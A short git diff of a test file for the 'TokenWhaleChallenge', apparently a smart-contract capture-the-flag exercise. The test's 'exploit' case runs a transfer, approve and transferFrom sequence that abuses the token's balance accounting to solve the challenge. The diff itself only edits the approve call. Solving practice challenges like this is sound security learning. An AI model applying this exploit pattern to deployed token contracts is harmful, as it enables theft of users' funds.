@@ -20,7 +20,7 @@ describe('TokenWhaleChallenge', () => {
 
   it('exploit', async () => {
     await target.connect(attacker).transfer(deployer.address, 501);
-    await target.connect(deployer).approve(attacker.address, 501);
+    await target.approve(attacker.address, 501);
     await target.connect(attacker).transferFrom(deployer.address, deployer.address, 501);
 
     expect(await target.isComplete()).to.equal(true);
